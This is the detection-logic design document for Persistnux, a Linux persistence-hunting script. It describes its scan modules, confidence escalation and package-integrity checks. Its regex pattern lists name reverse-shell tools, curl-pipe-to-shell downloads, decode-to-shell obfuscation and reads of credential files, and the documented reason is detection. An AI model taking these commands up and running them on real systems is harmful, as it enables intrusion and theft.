# Persistnux Detection Logic Tree

## Version 2.2.0

This document describes the complete detection and analysis logic flow.

---

## Use Cases

### 1. Incident Response - Post-Compromise Analysis
```bash
# Full scan with all findings for forensic analysis
sudo ./persistnux.sh --all

# Output: Complete inventory of all persistence mechanisms
# Use: Compare against known-good baseline, identify anomalies
```

### 2. Threat Hunting - Proactive Search
```bash
# Focus on HIGH/CRITICAL findings only
sudo MIN_CONFIDENCE=HIGH ./persistnux.sh

# Output: Only suspicious findings requiring immediate investigation
# Use: Quick triage during active threat hunt
```

### 3. Security Audit - Compliance Check
```bash
# Standard suspicious-only scan
sudo ./persistnux.sh

# Output: MEDIUM, HIGH, CRITICAL findings
# Use: Regular security audits, identify misconfigurations
```

### 4. Baseline Creation
```bash
# Capture all persistence points on clean system
sudo FILTER_MODE=all ./persistnux.sh
mv persistnux_output/ baseline_$(date +%Y%m%d)/

# Later: Compare against baseline
diff baseline_*/persistnux_*.csv current_scan/persistnux_*.csv
```

---

## Detection Module Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                    PERSISTNUX EXECUTION FLOW                     │
├─────────────────────────────────────────────────────────────────┤
│  1. Initialize   → Parse args, create output files              │
│  2. Build Patterns → Compile regex for fast matching            │
│     ├── COMBINED_NEVER_WHITELIST_PATTERN (always-flag)          │
│     ├── COMBINED_COMMAND_PATTERN (suspicious commands)          │
│     ├── COMBINED_NETWORK_PATTERN (network indicators)           │
│     └── UNIFIED_SUSPICIOUS_PATTERN = union of all three         │
│  3. Run 7 Detection Modules (sequential)                        │
│  4. Output → CSV + JSONL with matched patterns                  │
│  5. Cleanup → Remove temp files                                 │
└─────────────────────────────────────────────────────────────────┘

Detection Modules:
  [1/7] Systemd Services    → .service files, ExecStart analysis
  [2/7] Cron Jobs           → System/user crontabs, at jobs
  [3/7] Shell Profiles      → .bashrc, .profile, /etc/profile.d
  [4/7] Init Scripts        → rc.local, /etc/init.d
  [5/7] Kernel/Preload      → ld.so.preload, kernel modules
  [6/7] Additional          → XDG autostart, sudoers, PAM, MOTD
  [7/7] Backdoor Locations  → Package managers, git, webshells
```

---

## Confidence Level Definitions

| Level | Meaning | Action Required |
|-------|---------|-----------------|
| **LOW** | Baseline system config, package-managed | Informational only |
| **MEDIUM** | Potentially suspicious, needs review | Manual review recommended |
| **HIGH** | Suspicious patterns detected | Investigate immediately |
| **CRITICAL** | Modified package files, SUID+suspicious, likely compromise | Incident response required |

### Automatic Escalation Rules (v2.2.0)

- **MEDIUM → HIGH**: File modified within last 7 days
- **HIGH → CRITICAL**: SUID or SGID bit set (`rwsr-xr-x` / `rwxr-sr-x`) on a suspiciously-matching file
- **ANY → CRITICAL**: Package verification failure (dpkg/rpm --verify reports file modified)

---

## Pattern Architecture (v2.2.0)

### Pattern Arrays (Authoritative Source)

All patterns are defined in bash arrays at the top of the script. These are the **single source of truth** — all runtime patterns are derived from them.

```
NEVER_WHITELIST_PATTERNS[]    → Always flag, regardless of package status
SUSPICIOUS_COMMANDS[]         → Common attack command patterns
SUSPICIOUS_NETWORK_PATTERNS[] → Network/shell indicator patterns
SUSPICIOUS_LOCATIONS[]        → Filesystem paths that are always suspicious
```

### build_combined_patterns() — Startup Derivation

At startup, `build_combined_patterns()` joins each array into a pipe-delimited combined regex and builds the unified gate:

```bash
IFS='|'
COMBINED_NEVER_WHITELIST_PATTERN="${NEVER_WHITELIST_PATTERNS[*]}"
COMBINED_COMMAND_PATTERN="${SUSPICIOUS_COMMANDS[*]}"
COMBINED_NETWORK_PATTERN="${SUSPICIOUS_NETWORK_PATTERNS[*]}"

# UNIFIED is derived — never hardcoded
UNIFIED_SUSPICIOUS_PATTERN="${COMBINED_NEVER_WHITELIST_PATTERN}|${COMBINED_COMMAND_PATTERN}|${COMBINED_NETWORK_PATTERN}"
```

**Key invariant:** Any pattern added to an array is automatically included in UNIFIED and all combined patterns. There is no separate string to maintain.

### quick_suspicious_check() — First Gate

Before any deep analysis, every command/file is tested against UNIFIED_SUSPICIOUS_PATTERN in a single `grep -qiE` call. If no match, analysis stops immediately. This eliminates the bulk of subprocess overhead for clean files.

```
Input command → grep -qiE "$UNIFIED_SUSPICIOUS_PATTERN"
                     │
            ┌────────┴────────┐
           MISS              HIT
            │                 │
        SKIP all           Continue to
        analysis           specific checks
```

---

## Module 1: Systemd Services Detection Tree

```
┌─────────────────────────────────────────────────────────────────┐
│              SYSTEMD SERVICE ANALYSIS (v2.2.0)                  │
│         Only scans .service files (not .socket/.timer)          │
│         Disabled services skipped UNLESS a matching .timer      │
│         file exists in any systemd path (timer activates it)    │
│                                                                 │
│  OPTIMIZATION: Package verification FIRST, skip analysis if OK  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ SCAN PATHS:                                                     │
│   /etc/systemd/system     /usr/lib/systemd/system               │
│   /lib/systemd/system     /run/systemd/system                   │
│   /etc/systemd/user       ~/.config/systemd/user                │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │   For each .service file:     │
              │   Extract: ExecStart=<cmd>    │
              │   Get: enabled status, age    │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │   Is ExecStart present?       │
              └───────────────────────────────┘
                     │              │
                    YES            NO
                     │              │
                     │              ▼
                     │    ┌────────────────────────┐
                     │    │ Check service file     │
                     │    │ package status:        │
                     │    │ • Verified → LOW       │
                     │    │ • Modified → CRITICAL  │
                     │    │ • Unmanaged → MEDIUM   │
                     │    └────────────────────────┘
                     │
                     ▼
         ┌──────────────────────────────────┐
         │     Extract executable from       │
         │     ExecStart command             │
         └──────────────────────────────────┘
                     │
                     ▼
    ┌────────────────────────────────────────┐
    │   Is executable an INTERPRETER?        │
    │   (python, perl, ruby, bash, sh, etc.) │
    └────────────────────────────────────────┘
           │                        │
          YES                       NO
           │                        │
           ▼                        ▼

═══════════════════════════════════════════════════════════════════
                    INTERPRETER PATH
═══════════════════════════════════════════════════════════════════

    ┌────────────────────────────────────────┐
    │ 1. Check interpreter binary itself     │
    │                                        │
    │ Is /usr/bin/python3 compromised?       │
    │   • Modified package → CRITICAL        │
    │   • Unmanaged from odd path → HIGH     │
    └────────────────────────────────────────┘
                     │
                     ▼
    ┌────────────────────────────────────────┐
    │ 2. Extract script path from args       │
    │                                        │
    │ ExecStart=/usr/bin/python3 /opt/app.py │
    │                              ▲          │
    │               THIS is what we analyze  │
    └────────────────────────────────────────┘
                     │
         ┌───────────┴───────────┐
         │                       │
    Script found            No script (inline -c)
         │                       │
         ▼                       ▼
    ┌────────────────┐    ┌──────────────────────┐
    │ Check SCRIPT's │    │ Inline code          │
    │ package status │    │ python -c "..."      │
    │ FIRST!         │    │ → analyze_inline_code│
    └────────────────┘    │ → HIGH               │
         │                └──────────────────────┘
    ┌────┴────┬──────────────┐
    │         │              │
 Verified  Modified     Unmanaged
    │         │              │
    ▼         ▼              ▼
┌──────┐  ┌────────┐  ┌──────────────────┐
│ LOW  │  │CRITICAL│  │ analyze_script_  │
│ DONE │  │ DONE   │  │ content():       │
│ SKIP │  │        │  │ • NEVER_WHITELIST│
│ REST │  │        │  │ • commands       │
└──────┘  └────────┘  │ • multiline      │
                      │ • encoding       │
                      │ • entropy+exec   │
                      │ Suspicious →HIGH │
                      └──────────────────┘


═══════════════════════════════════════════════════════════════════
                    DIRECT BINARY PATH
═══════════════════════════════════════════════════════════════════

    ┌────────────────────────────────────────┐
    │ 1. Check package status FIRST          │
    │                                        │
    │    dpkg -S /usr/sbin/sshd              │
    │    dpkg --verify openssh-server        │
    └────────────────────────────────────────┘
                     │
    ┌────────────────┼────────────────┐
    │                │                │
 Verified        Modified        Unmanaged
    │                │                │
    ▼                ▼                ▼
┌──────────┐   ┌──────────┐   ┌───────────────────┐
│   LOW    │   │ CRITICAL │   │ Continue with     │
│   DONE   │   │   DONE   │   │ full analysis...  │
│          │   │          │   │                   │
│ ★ SKIP   │   │          │   │                   │
│ ALL      │   │          │   │                   │
│ PATTERN  │   │          │   │                   │
│ ANALYSIS │   │          │   │                   │
└──────────┘   └──────────┘   └───────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 2. Location check               │
                   │    /tmp, /dev/shm → HIGH        │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 3. If script, analyze content   │
                   │    Suspicious patterns → HIGH   │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 4. Pattern match on ExecStart   │
                   │    curl|bash, /dev/tcp → HIGH   │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 5. Time-based check             │
                   │    Recent + enabled → HIGH      │
                   └──────────────────────────────────┘


═══════════════════════════════════════════════════════════════════
                    PERFORMANCE IMPACT
═══════════════════════════════════════════════════════════════════

BEFORE (old flow):
  For EVERY service file:
    1. grep dangerous patterns     ← subprocess
    2. grep suspicious patterns    ← 4+ subprocess calls
    3. check is_command_safe       ← package check here (late!)
    4. more analysis...

AFTER (optimized):
  For EVERY service file:
    1. Extract executable
    2. Check package status        ← EARLY EXIT if verified
       └─ Verified? → LOW, DONE    ← Skip all grep calls!

  Typical system: ~200 services, ~180 are package-managed
  BEFORE: 200 × (5+ grep calls) = 1000+ subprocesses
  AFTER:  200 × (1 dpkg call) + 20 × (5 grep calls) = 300 calls

  ≈ 70% reduction in subprocess spawning!
```

---

## Script Content Analysis (v2.2.0)

`analyze_script_content()` is called for unmanaged scripts to determine if content is suspicious.

### Content Sampling Strategy

For files of any size, content is read in up to **three zones**:

```
┌─────────────────────────────────────────────────────────────────┐
│  File size ≤ 1000 lines:   read entire file                     │
│                                                                 │
│  File size > 1000 lines:   head-1000 + tail-200                 │
│                                                                 │
│  File size > 1200 lines:   head-1000 + mid-200 + tail-200       │
│                             (mid = lines [N/2-100 .. N/2+99])   │
└─────────────────────────────────────────────────────────────────┘
```

This three-zone approach ensures that content buried in the middle of large scripts (lines 1001 to N-200) is not missed.

### Comment Stripping

Before any pattern check, a clean copy is derived:

```bash
script_content_clean=$(echo "$script_content" | grep -Ev '^[[:space:]]*#')
```

All NEVER_WHITELIST, COMBINED_COMMAND, multiline, encoding, and most other checks run against `script_content_clean`. This prevents false positives from commented-out educational code (e.g., `# Example: curl | bash`).

### Analysis Checks (in order)

```
1. NEVER_WHITELIST check        → CRITICAL match → return immediately
2. COMBINED_COMMAND check       → suspicious command match
   └── If interpreter -c/-e:   → call analyze_inline_code()
3. COMBINED_NETWORK check       → network tool match
4. Multiline pattern check      → multi-statement obfuscation
5. Hex/octal/ANSI-C encoding    → obfuscated string literals
6. tr-based cipher patterns     → ROT13/ROT47 decode-to-shell
7. rev decode patterns          → rev <<< string | bash
8. High-entropy + exec context  → base64 blobs next to eval/exec
9. Base64 encoded content       → decode and re-analyze
```

### Entropy Detection (v2.0.0 — reduced FP)

Standalone high-entropy strings are **not** flagged (too many false positives from TLS certs, UUIDs, API keys). Entropy is only flagged as `high_entropy_exec` when the same line also contains an execution context:

```
High-entropy value on same line as:
  eval | exec | base64.*-d | bash | sh -c | openssl.*-d
        → MATCH: high_entropy_exec
Otherwise:
        → SKIP (not suspicious alone)
```

### Inline Code Analysis (v2.2.0)

When a matched line contains an interpreter with a `-c` or `-e` flag, `analyze_inline_code()` is called to extract and analyze the argument:

```bash
# Trigger: line contains interpreter + -c/-e flag
if echo "$full_line" | grep -qiE '(bash|sh|dash|zsh|python[0-9.]*|perl[0-9.]*|ruby[0-9.]*)[[:space:]].*-[ce][[:space:]]'; then
    analyze_inline_code "$full_line"
fi
```

`analyze_inline_code()` extracts the quoted argument (single or double quoted), runs the same suspicious pattern battery against the extracted code, and sets `MATCHED_PATTERN="script_suspicious+inline:${INLINE_CODE_REASON}"`.

---

## Pattern Matching Logic

### Pattern Categories and Examples

```
┌─────────────────────────────────────────────────────────────────┐
│                    PATTERN MATCHING FLOW                        │
└─────────────────────────────────────────────────────────────────┘

Input: ExecStart="/usr/bin/python3 -c 'import socket;s=socket.socket()'"

                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ COMBINED PATTERN CHECK (Fast Path)                              │
│                                                                 │
│ Build combined regex from all patterns in category:             │
│   (pattern1|pattern2|pattern3|...)                              │
│                                                                 │
│ Single grep -qE check - if no match, skip category              │
└─────────────────────────────────────────────────────────────────┘
                              │
                         Match Found
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ SPECIFIC PATTERN IDENTIFICATION                                 │
│                                                                 │
│ Loop through individual patterns to find exact match:           │
│   Pattern: "python.*socket\.socket"                             │
│   Match:   "python3 -c 'import socket;s=socket.socket"          │
│                                                                 │
│ Set globals:                                                    │
│   MATCHED_PATTERN = "python.*socket\.socket"                    │
│   MATCHED_CATEGORY = "command"                                  │
│   MATCHED_STRING = "python3 -c 'import socket;s=socket.socket"  │
└─────────────────────────────────────────────────────────────────┘
```

### NEVER_WHITELIST Patterns (Always HIGH/CRITICAL)

These patterns ALWAYS trigger regardless of package management status:

```
Category: Reverse Shell Indicators
├── /dev/tcp/              # Bash network pseudo-device
├── /dev/udp/              # Bash network pseudo-device
├── bash -i                # Interactive shell (reverse shell classic)
├── sh -i                  # Interactive shell
├── nc -e                  # Netcat execute
├── nc .*-e                # Netcat execute (alternate flag order)
├── ncat -e                # Ncat execute
├── busybox nc.*-e         # BusyBox netcat execute
├── busybox.*(sh|bash).*-[ice]  # BusyBox shell invocation
├── \| *nc                 # Piping to netcat
├── \| *bash\b             # Piping to bash
├── \| *sh\b               # Piping to sh
├── \| */bin/sh            # Piping to /bin/sh
├── \| */bin/bash          # Piping to /bin/bash
├── >&[ ]*/dev/            # Redirect to /dev (shell trick)
├── exec [0-9]*<>/dev/     # Bidirectional fd to /dev/tcp

Category: Decode-to-Shell Obfuscation
├── rev.*\|.*(bash|sh|exec)  # rev-encoded payload piped to shell
├── tr.*[A-Za-z].*\|.*(bash|sh)  # ROT13/ROT47 decode piped to shell
├── tr.*['"].*['"].*\|.*(bash|sh) # tr cipher variant piped to shell
├── dd.*\|.*(bash|sh)      # dd-based payload delivery
├── cat.*<<.*EOF.*bash     # Heredoc piped to bash
├── base64.*-d.*<<.*EOF    # Base64 heredoc decode
├── eval.*<<.*EOF          # Eval heredoc

Category: Socket Operations
├── python.*socket\.socket # Python socket creation
├── python.*socket.*connect
├── perl.*socket.*connect
├── ruby.*TCPSocket
├── ruby.*Socket\.new

Category: Network Tools
├── socat.*exec:           # Socat with exec
├── socat.*TCP:            # Socat TCP
├── telnet.*\|.*(bash|sh)  # Telnet piped to shell
├── xterm -display         # X11 forwarding abuse
├── nohup .*/tmp/          # Persistent background exec from /tmp
├── nohup .*/dev/shm/      # Persistent background exec from /dev/shm
├── tftp.*-g               # TFTP download

Category: Named Pipes / Staging
├── mknod.*backpipe
└── mkfifo.*/( tmp|dev/shm|var/tmp)

Category: Source from Temp
├── source .*/tmp/
├── source .*/dev/shm/
├── \. .*/tmp/
└── \. .*/dev/shm/
```

### SUSPICIOUS_COMMANDS Patterns

```
Category: Download & Execute
├── curl.*\|.*bash         # curl | bash
├── curl.*\|.*sh           # curl | sh
├── wget.*\|.*bash         # wget | bash
├── wget.*\|.*sh           # wget | sh
├── `curl.*\|.*bash        # Backtick curl | bash
├── `wget.*\|.*bash        # Backtick wget | bash
├── curl.* sh -c           # curl output to sh -c
├── wget.* sh -c           # wget output to sh -c
├── curl.*-o.*/tmp         # Download to /tmp
├── curl.*-o.*/dev/shm     # Download to /dev/shm
├── wget.*-O.*/tmp         # Download to /tmp
└── wget.*-O.*/dev/shm     # Download to /dev/shm

Category: Permission Manipulation
├── chmod \+x.*/tmp        # Executable in /tmp
├── chmod \+x.*/dev/shm    # Executable in /dev/shm
└── chmod 777[[:space:]]   # World-writable (exact, avoids FP on 7770)

Category: Obfuscation/Encoding
├── base64 -d              # Base64 decode
├── base64 --decode        # Base64 decode (long form)
├── eval.*\\\$.*base64     # Eval base64 decoded content
├── echo.*\|.*base64.*-d   # Echo to base64 decode
└── openssl.*-d.*-base64   # OpenSSL base64 decode

Category: Inline Code Execution
├── python.*-c.*import.*(socket|subprocess|pty|ctypes|
│       os\.system|popen|base64|exec\b|eval\b)
│                          # Python one-liner: only dangerous imports
│                          # (import sys, import re → NOT flagged)
├── python.*-c.*exec\(     # Python inline exec()
├── perl -e                # Perl one-liner
├── ruby -e                # Ruby one-liner
├── php -r                 # PHP one-liner
└── php.*fsockopen         # PHP socket connection

Category: Sensitive File Access
├── /etc/shadow
├── /etc/passwd
├── /root/.ssh
├── id_rsa
└── authorized_keys
```

### SUSPICIOUS_LOCATIONS Patterns

```
^/dev/shm/                 # Shared memory (volatile, no audit log)
^/tmp/                     # Temp directory
^/var/tmp/                 # Persistent temp
/\.[a-z]                   # Hidden files/dirs
\.\./\.\.                  # Path traversal
```

---

## Package Management Detection (v2.2.0)

### is_package_managed() Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                  PACKAGE STATUS DETECTION                       │
└─────────────────────────────────────────────────────────────────┘
                              │
                    Check PKG_CACHE first
                         │        │
                     HIT │        │ MISS
                         ▼        ▼
                    Return      Continue detection
                    cached
                              │
                ┌─────────────┼─────────────┐
                │             │             │
           dpkg -S        rpm -qf      pacman -Qo
                │
        ┌───────┴───────┐
        │               │
    Package found   Not found
        │               │
        ▼               ▼
   dpkg --verify   → Check snap:
    (integrity)      /snap/ (any path)  ← covers ~/snap/ user installs
        │            /var/lib/snapd/
   ┌────┴────┐
   │         │
 PASS    FAIL (modified)
   │         │
 "dpkg:  "dpkg:pkg:
  pkg"   MODIFIED"

                    → Check flatpak:
                      /var/lib/flatpak/
                      ~/.local/share/flatpak/

                    → Check runtime-managed:
                      /node_modules/         ← npm packages
                      /site-packages/        ← Python pip packages
                      /dist-packages/        ← Python system packages
                      /.cargo/registry/      ← Rust crates (installed)
                      /.cargo/bin/           ← Rust binaries
                      /go/pkg/mod/           ← Go modules
                      /gems/gems/            ← Ruby gems

                    → Not matched → "unmanaged"
```

### adjust_confidence_for_package()

| Package Status | HIGH input | MEDIUM input | LOW input |
|---------------|------------|--------------|-----------|
| `dpkg:pkg:MODIFIED` | CRITICAL | CRITICAL | CRITICAL |
| `verified` (dpkg/rpm/pacman) | MEDIUM | LOW | LOW |
| `snap:pkg` | MEDIUM | LOW | LOW |
| `flatpak:pkg` | MEDIUM | LOW | LOW |
| `runtime-managed` | MEDIUM | LOW | LOW |
| `unmanaged` | HIGH | MEDIUM | LOW |

---

## Module 3: Shell Profiles Detection (v2.2.0)

```
SCAN LOCATIONS:
├── System profiles: /etc/profile, /etc/bash.bashrc, /etc/zsh/zshrc,
│     /etc/profile.d/*.sh, /etc/fish/config.fish
├── User profiles: ~/.bashrc, ~/.bash_profile, ~/.profile, ~/.zshrc,
│     ~/.config/fish/config.fish  (for each user in /etc/passwd)
└── Global XDG: /etc/environment, /etc/xdg/autostart

For each profile:
  1. Check package status → is_package_managed()
     │
     ├── verified  → LOW
     ├── modified  → CRITICAL
     └── unmanaged → analyze content:

  2. Parse for sourced files / exec commands
     └── For each extracted command:
           → quick_suspicious_check()
           → analyze_inline_code() if -c/-e flag
           → analyze_script_content() if script path

  3. Time-based elevation (ALL 4 loops):
     │  mod_time extracted from metadata
     │  days_old < 7 AND confidence == MEDIUM
     └→ confidence = HIGH

  4. add_finding() with package_status in metadata
```

---

## Module 2: Cron Detection Logic

```
┌─────────────────────────────────────────────────────────────────┐
│                     CRON ANALYSIS FLOW                          │
└─────────────────────────────────────────────────────────────────┘

SCAN LOCATIONS:
├── /etc/crontab           # System crontab
├── /etc/cron.d/*          # System cron jobs
├── /etc/cron.daily/*      # Daily scripts
├── /etc/cron.hourly/*     # Hourly scripts
├── /etc/cron.weekly/*     # Weekly scripts
├── /etc/cron.monthly/*    # Monthly scripts
├── /var/spool/cron/*      # User crontabs
└── at jobs (atq)          # Scheduled one-time jobs

For each cron file/entry:
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Check for suspicious content: │
              │ UNIFIED_SUSPICIOUS_PATTERN    │
              │ (derived from all arrays)     │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Check modification age:       │
              │ < 7 days + MEDIUM → HIGH      │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ If cron is a script:          │
              │ → run analyze_script_content  │
              │ → check for interpreters      │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Adjust for package management │
              │ Package-managed → Lower conf  │
              └───────────────────────────────┘
```

---

## Modules 4-7: Other Detection Modules

### Init Scripts (Module 4)
```
SCAN: /etc/rc.local, /etc/init.d/*, /etc/rc*.d/*
CHECK: Suspicious commands in startup scripts via UNIFIED pattern
CONFIDENCE: curl/wget/nc in init → HIGH
```

---

### Kernel/Preload (Module 5) — v2.2.0

Module 5 covers six distinct kernel/preload subsystems. Each has its own
integrity and content analysis flow.

```
┌─────────────────────────────────────────────────────────────────┐
│              KERNEL/PRELOAD DETECTION (v2.2.0)                  │
├─────────────────────────────────────────────────────────────────┤
│  TYPE 1: /etc/ld.so.preload        → library integrity          │
│  TYPE 2: /etc/ld.so.conf[.d]       → conf integrity + .so scan  │
│  TYPE 3: /etc/environment          → LD_PRELOAD lib verification │
│  TYPE 4: /etc/modules-load.d       → .ko file verification      │
│  TYPE 5: /etc/modprobe.d           → install/blacklist analysis  │
│  TYPE 6: lsmod                     → loaded module enumeration   │
└─────────────────────────────────────────────────────────────────┘
```

#### TYPE 1: /etc/ld.so.preload
```
If /etc/ld.so.preload exists and is non-empty:
  → add_finding HIGH (ld_so_preload_present)

For each library path listed in the file:
  → is_package_managed(lib_path)
     ├── verified  → LOW  (unusual but legitimate)
     ├── modified  → CRITICAL (modified_ld_preload_lib)
     └── unmanaged → HIGH  (unmanaged_ld_preload_lib)
```

#### TYPE 2: /etc/ld.so.conf + /etc/ld.so.conf.d/*
```
Step A — Config file integrity:
  For each conf file:
  → is_package_managed(conf_file)
     ├── verified  → skip
     ├── modified  → CRITICAL (modified_ld_conf)
     └── unmanaged → MEDIUM  (unmanaged_ld_conf)

Step B — Non-standard path .so scan:
  Extract all directory paths listed in conf files.
  Exclude standard system dirs:
    /usr/lib, /usr/lib64, /lib, /lib64
  For each remaining (non-standard) path:
    find *.so files within it
    For each .so file:
    → is_package_managed(so_file)
       ├── verified  → skip
       ├── modified  → CRITICAL (modified_nonstandard_so)
       └── unmanaged → HIGH    (unmanaged_nonstandard_so)
```

#### TYPE 3: /etc/environment — LD_PRELOAD/LD_LIBRARY_PATH Library Verification
```
If /etc/environment contains LD_PRELOAD or LD_LIBRARY_PATH:
  → add_finding HIGH on the env file itself (env_ld_preload_set)

For each absolute path value extracted:
  → is_package_managed(lib_path)
     ├── verified  → LOW  (env_ld_preload_verified)
     ├── modified  → CRITICAL (env_ld_preload_modified)
     └── unmanaged → CRITICAL (env_ld_preload_unmanaged)

Note: The env file finding and the library finding are separate.
An attacker-installed library is CRITICAL regardless of whether
the env file itself looks suspicious.
```

#### TYPE 4: /etc/modules + /etc/modules-load.d/* — .ko File Verification
```
Step A — Config file integrity:
  For each config file:
  → is_package_managed(config_file)
     ├── verified  → skip (skip ko verification too)
     ├── modified  → CRITICAL (modified_module_config) + run ko verification
     └── unmanaged → MEDIUM  (unmanaged_module_config) + run ko verification

Step B — .ko file verification (per unique module name):
  Extract module names (non-comment, non-blank lines)
  For each module name:
    modinfo -F filename <name> → resolve to .ko path
    ├── empty or "(builtin)" → skip
    ├── .ko path outside /lib/modules/ or /usr/lib/modules/
    │     → HIGH (module_ko_unexpected_location)
    └── .ko path within standard location:
          → is_package_managed(ko_path)
             ├── verified  → skip
             ├── modified  → CRITICAL (modified_module_ko)
             └── unmanaged → MEDIUM  (unmanaged_module_ko)
    Module name not resolved by modinfo at all → MEDIUM (module_missing_ko)
```

#### TYPE 5: /etc/modprobe.d/ + /etc/modprobe.conf — Install/Blacklist Analysis
```
Step A — Config file integrity:
  Collect: /etc/modprobe.conf + all files in /etc/modprobe.d/
  For each config file:
  → is_package_managed(config_file)
     ├── verified  → MEDIUM baseline (modprobe_config)
     ├── modified  → CRITICAL (modified_modprobe_config)
     └── unmanaged → MEDIUM  (unmanaged_modprobe_config)

Step B — install directive analysis:
  Extract: lines matching "^install <module> <command>"
  For each install command target:
    ├── Bash builtin or ":" → skip (legitimate no-op to block loading)
    ├── Not an absolute path → skip
    ├── Absolute path not on disk → CRITICAL (modprobe_install_missing_cmd)
    ├── Path in suspicious location (/tmp, /dev/shm, hidden dir)
    │     → CRITICAL (modprobe_install_suspicious_location)
    └── Absolute path exists:
          → is_package_managed(cmd_path)
             ├── verified  → MEDIUM (modprobe_install_verified_cmd)
             ├── modified  → CRITICAL (modprobe_install_modified_cmd)
             └── unmanaged → HIGH   (modprobe_install_unmanaged_cmd)

Step C — security module blacklist detection:
  Extract: lines matching "^blacklist <module>"
  If module name is one of: apparmor, selinux, seccomp, lockdown
    → HIGH (modprobe_security_blacklist)
    Note: blacklisting these silences kernel security enforcement
```

#### TYPE 6: lsmod — Loaded Module Enumeration
```
Run lsmod → enumerate all currently-loaded kernel modules
For each module:
  modinfo -F filename <name> → resolve to .ko path
  → is_package_managed(ko_path)
     ├── verified  → LOW (expected)
     ├── modified  → CRITICAL (modified_loaded_module)
     └── unmanaged → HIGH    (unmanaged_loaded_module)
```

---

### Additional Persistence (Module 6) — v2.2.0

#### XDG Autostart
```
SCAN: /etc/xdg/autostart/*.desktop
      + ~/.config/autostart/*.desktop for all users in /etc/passwd (root only)
CHECK: Exec= line analyzed via quick_suspicious_check() + analyze_script_content()
CONFIDENCE: Suspicious Exec= → HIGH; recently modified + MEDIUM → HIGH
```

#### /etc/environment
```
See Kernel/Preload Module 5 TYPE 3 above for library verification.
The env file itself is scanned for LD_PRELOAD/LD_LIBRARY_PATH presence.
```

#### Sudoers
```
SCAN: /etc/sudoers, /etc/sudoers.d/*
CHECK:
  1. is_package_managed() — modified → CRITICAL
  2. Content analysis:
     → grep for NOPASSWD or .*ALL.*=.*ALL patterns
       If found: confidence escalated to HIGH
CONFIDENCE: NOPASSWD or broad ALL grant → HIGH
```

#### PAM (Pluggable Authentication Modules) — v2.2.0

```
┌─────────────────────────────────────────────────────────────────┐
│                  PAM DETECTION (v2.2.0)                         │
├─────────────────────────────────────────────────────────────────┤
│  Step 1: Build _all_pam_files (file collection)                 │
│  Step 2: Config file integrity check                            │
│  Step 3: Module .so integrity (named + absolute-path refs)      │
│  Step 4: pam_exec.so relay detection                            │
│  Step 5: pam_python/pam_perl relay detection                    │
│  Step 6: pam_script.so hook detection                           │
│  Step 7: pam_env.conf LD_PRELOAD                                │
│  Step 8: ~/.pam_environment LD_PRELOAD (root only)              │
│  Step 9: /etc/security/ general scan                            │
└─────────────────────────────────────────────────────────────────┘
```

**Step 1 — File Collection**
```
_all_pam_files = []
Add all files in /etc/pam.d/
Add /etc/pam.conf if it exists
For each file: extract @include directives
  → target outside /etc/pam.d/ → add to _all_pam_files (deduped)
Build _pam_cfg_content = concatenated content of all _all_pam_files
  (/etc/pam.conf lines stripped of leading service-name column)
```

**Step 2 — Config File Integrity**
```
For each file in _all_pam_files:
  → is_package_managed(pam_cfg_file)
     ├── verified  → skip (continue)
     ├── modified  → CRITICAL (pam_config_modified)
     └── unmanaged → skip   (pam-auth-update files not tracked by dpkg)
```

**Step 3 — Module .so Integrity**
```
Extract named modules (e.g., pam_unix.so) from _pam_cfg_content
  → resolve to full path via /lib/security/, /lib/*/security/, etc.
Extract absolute-path .so references (e.g., /opt/custom/pam_evil.so)
  → use path directly

For each unique resolved path (deduped by full path):
  → is_package_managed(module_path)
     ├── verified  → skip
     ├── modified  → CRITICAL (modified_pam_module)
     └── unmanaged → HIGH    (unmanaged_pam_module)
```

**Step 4 — pam_exec.so Relay Detection**
```
Extract pam_exec.so lines from _pam_cfg_content
Regex handles all argument forms:
  pam_exec.so /path/to/script
  pam_exec.so expose_authtok /path/to/script      (bare flag)
  pam_exec.so log=/var/log/pam.log /path/to/script (key=value)
  pam_exec.so --quiet /path/to/script              (double-dash flag)

For extracted exec_script path:
  → is_package_managed(exec_script)
     ├── verified  → LOW
     ├── modified  → CRITICAL (pam_exec_modified_script)
     └── unmanaged:
          ├── script does not exist on disk
          │     → CRITICAL (pam_exec_missing_script)
          │       [post-compromise cleanup indicator]
          ├── script in /tmp, /dev/shm, /run/user/, or hidden dir
          │     → CRITICAL (pam_exec_suspicious_location)
          ├── analyze_script_content() returns suspicious
          │     → CRITICAL (matched pattern from analysis)
          └── clean unmanaged script
                → HIGH (pam_exec_unmanaged_script)
```

**Step 5 — pam_python / pam_perl Relay Detection**
```
For each relay module in [pam_python, pam_perl]:
  Extract script path argument from _pam_cfg_content
  Apply same verification flow as pam_exec (Step 4):
    missing → CRITICAL, suspicious location/content → CRITICAL
    clean unmanaged → CRITICAL (relay modules have no legitimate use case)
  add_finding identifies which relay module triggered the finding
```

**Step 6 — pam_script.so Hook Detection**
```
If pam_script.so is referenced in _pam_cfg_content:
  Scan known hook paths in /etc/security/:
    pam_script_auth, pam_script_acct, pam_script_passwd, pam_script_ses
  For each hook file that exists:
    → is_package_managed(hook_file)
       ├── modified  → CRITICAL (pam_script_hook_modified)
       ├── unmanaged:
       │     analyze_script_content(hook_file)
       │     ├── suspicious → CRITICAL (pam_script_hook)
       │     └── clean      → HIGH    (pam_script_hook)
       └── verified  → LOW
```

**Step 7 — pam_env.conf LD_PRELOAD**
```
If /etc/security/pam_env.conf contains LD_PRELOAD= or DEFAULT=*:
  Extract absolute path value
  → is_package_managed(lib_path)
